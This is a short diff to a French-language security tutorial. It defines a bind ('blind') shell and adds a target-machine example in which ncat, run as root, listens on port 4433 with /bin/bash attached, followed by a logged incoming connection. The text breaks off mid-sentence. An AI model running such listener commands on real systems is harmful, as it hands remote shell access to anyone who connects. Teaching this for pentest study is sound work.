@@ -76,3 +76,14 @@ Videos
 
 Un **blind shell** est ce qui se produit quand une cible va **démarrer un listener** attaché à un shell. Ce **port** est alors **ouvert** et on peut s'y connecter et obtenir l'execution du shell. L'avantage est qu'**on a aucune configuration à faire sur notre réseau** mais il peut être **empeché par des firewalls**.
 
+Machine cible
+
+```shell
+root@raspberrypi:/home/thomas# ncat -vnlp 4433 -e /bin/bash
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4433
+Ncat: Listening on 0.0.0.0:4433
+Ncat: Connection from 192.168.1.100.
+Ncat: Connection from 192.168.1.100:57085.
+```
+Lancement du
